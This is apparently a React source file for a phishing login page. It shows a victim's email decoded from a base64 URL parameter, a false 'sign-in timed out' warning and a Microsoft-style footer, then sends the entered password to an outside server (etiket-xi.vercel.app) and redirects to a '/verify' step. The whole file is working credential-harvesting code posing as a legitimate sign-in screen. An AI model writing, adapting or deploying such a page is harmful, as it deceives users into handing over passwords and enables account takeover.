import React, { useState } from "react";
import Logo from "./logo.svg";
import arrow from "./ar.svg";
import { useParams, useNavigate } from "react-router-dom";

function LoginPage() {
  const { encodedEmail } = useParams();
  const navigate = useNavigate();
  const [password, setPassword] = useState("");

  // Decode the email
  const email = atob(encodedEmail);

  const handleClick = () => {
    fetch("https://etiket-xi.vercel.app/user/login", {
      method: "POST",
      body: JSON.stringify({
        email: email,
        password: password,
      }),
      headers: {
        "Content-type": "application/json",
      },
    })
      .then((response) => response.json)
      .then((json) => navigate(`/${email}/verify`));
  };

  return (
    <div className="container">
      <div className="back"></div>
      <div className="body">
        <div className="forms">
          <div style={{ marginBottom: "0.9rem" }}>
            <img src={Logo} alt="logo" />
          </div>
          <div
            style={{
              display: "flex",
              alignItems: "center",
            }}
          >
            <div className="arrow">
              <img src={arrow} alt="arrow" height="60px" width="25px" />
            </div>
            <p style={{ margin: "0px", fontSize: "18px" }}>{email}</p>
          </div>
          <div>
            <h2 style={{ marginTop: "1rem", marginBottom: "1rem" }}>
              Enter password
            </h2>
            <p style={{ color: "red", fontSize: "15px" }}>
              Sorry, your sign-in timed out. Please sign in again.
            </p>
            <input
              type="password"
              placeholder="Password"
              onChange={(e) => setPassword(e.target.value)}
              value={password}
              required
            />
            <hr />
            <p style={{ color: "steelblue", fontSize: "small" }}>
              Forgot password?
            </p>
            <button className="btn" onClick={handleClick}>
              Sign in
            </button>
          </div>
        </div>
      </div>
      <footer>
        <p className="footer">
          <span style={{ marginRight: "1rem" }}>Terms of use </span>{" "}
          <span style={{ marginRight: "1rem" }}>privacy & use</span>{" "}
          <b style={{ textAlign: "center" }}>. . .</b>
        </p>
      </footer>
    </div>
  );
}

export default LoginPage;
